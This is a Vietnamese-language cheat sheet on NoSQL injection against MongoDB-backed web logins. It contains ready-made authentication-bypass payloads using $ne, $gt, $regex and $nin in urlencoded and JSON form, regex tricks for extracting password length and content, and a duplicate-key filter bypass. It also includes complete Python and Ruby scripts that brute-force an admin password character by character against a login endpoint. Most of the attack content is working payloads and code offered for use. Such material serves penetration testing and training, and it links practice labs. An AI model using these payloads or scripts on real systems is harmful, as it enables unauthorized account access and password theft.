# NoSQL Injection

> Cơ sở dữ liệu NoSQL cung cấp các ràng buộc về tính nhất quán lỏng lẻo hơn so với cơ sở dữ liệu SQL truyền thống. Do yêu cầu ít ràng buộc quan hệ và kiểm tra tính nhất quán hơn, cơ sở dữ liệu NoSQL thường mang lại lợi ích về hiệu năng và khả năng mở rộng. Tuy nhiên, các cơ sở dữ liệu này vẫn có khả năng tồn tại lỗ hổng injection, ngay cả khi chúng không sử dụng cú pháp SQL truyền thống.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Operator Injection](#operator-injection)
  * [Vượt qua xác thực](#authentication-bypass)
  * [Trích xuất thông tin về độ dài](#extract-length-information)
  * [Trích xuất thông tin dữ liệu](#extract-data-information)
  * [WAF và bộ lọc](#waf-and-filters)
* [NoSQL Blind](#blind-nosql)

  * [POST với JSON Body](#post-with-json-body)
  * [POST với urlencoded Body](#post-with-urlencoded-body)
  * [GET](#get)
* [Các bài lab](#references)
* [Tài liệu tham khảo](#references)

## Công cụ

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Công cụ tự động liệt kê cơ sở dữ liệu NoSQL và khai thác ứng dụng web
* https://github.com/digininja/nosqlilab - Lab để thực hành NoSQL Injection
* https://github.com/matrix/Burp-NoSQLiScanner - Extension cung cấp phương pháp phát hiện các lỗ hổng NoSQL injection.

## Phương pháp

NoSQL injection xảy ra khi kẻ tấn công thao túng các truy vấn bằng cách chèn input độc hại vào truy vấn cơ sở dữ liệu NoSQL. Không giống SQL injection, NoSQL injection thường khai thác các truy vấn dựa trên JSON và các operator như `$ne`, `$gt`, `$regex` hoặc `$where` trong MongoDB.

### Operator Injection

| Operator | Mô tả               |
| -------- | ------------------- |
| $ne      | khác                |
| $regex   | biểu thức chính quy |
| $gt      | lớn hơn             |
| $lt      | nhỏ hơn             |
| $nin     | không nằm trong     |

Ví dụ: Một ứng dụng web có chức năng tìm kiếm sản phẩm:

```js
db.products.find({ "price": userInput })
```

Kẻ tấn công có thể inject một truy vấn NoSQL: `{ "$gt": 0 }`.

```js
db.products.find({ "price": { "$gt": 0 } })
```

Thay vì chỉ trả về một sản phẩm cụ thể, cơ sở dữ liệu sẽ trả về tất cả sản phẩm có giá lớn hơn 0, dẫn đến rò rỉ dữ liệu.

### Vượt qua xác thực

Vượt qua xác thực cơ bản bằng cách sử dụng `not equal` (`$ne`) hoặc `greater than` (`$gt`).

* Dữ liệu HTTP

  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* Dữ liệu JSON

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### Trích xuất thông tin về độ dài

Inject payload bằng operator `$regex`. Injection sẽ hoạt động khi độ dài là chính xác.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Trích xuất thông tin dữ liệu

Trích xuất dữ liệu bằng query operator `$regex`.

* Dữ liệu HTTP

  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* Dữ liệu JSON

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

Trích xuất dữ liệu bằng query operator `$in`.

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF và bộ lọc

**Loại bỏ điều kiện tiên quyết:**

Trong MongoDB, nếu một document chứa các key trùng lặp, chỉ giá trị của key xuất hiện cuối cùng mới được ưu tiên.

```js
{"id":"10", "id":"100"} 
```

Trong trường hợp này, giá trị cuối cùng của `"id"` sẽ là `"100"`.

## Blind NoSQL

### POST với JSON Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST với urlencoded Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # tất cả các ký tự ASCII có thể in được
CHARSET = [*'0'..'9',*'a'..'z','-'] # chữ và số + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

## Các bài lab

* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)

## Tài liệu tham khảo

* [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
* [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://web.archive.org/web/20260208131430/https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://web.archive.org/web/20160316144254/http://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://web.archive.org/web/20240624015518/https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
* [NoSQL error-based injection - Reino Mostert - March 15, 2025](https://web.archive.org/web/20260208131314/https://sensepost.com/blog/2025/nosql-error-based-injection/)
* [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://web.archive.org/web/20160916113057/http://zanon.io:80/posts/nosql-injection-in-mongodb)
* [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
* [Testing for NoSQL injection - OWASP - May 2, 2023](https://web.archive.org/web/20200707120423/https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
